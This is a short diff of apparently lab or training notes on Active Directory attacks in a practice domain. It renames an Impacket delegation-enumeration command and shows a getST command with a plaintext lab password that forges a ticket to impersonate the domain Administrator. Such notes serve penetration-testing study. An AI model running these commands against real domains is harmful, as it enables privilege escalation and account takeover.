@@ -126,7 +126,7 @@ Enter-PSSession ws01.inlanefreight.local
 
 ### Linux
 ```bash
-findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
+impacket-findDelegation INLANEFREIGHT.LOCAL/carole.rose:jasmine
 ```
 ```bash
 impacket-getST -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
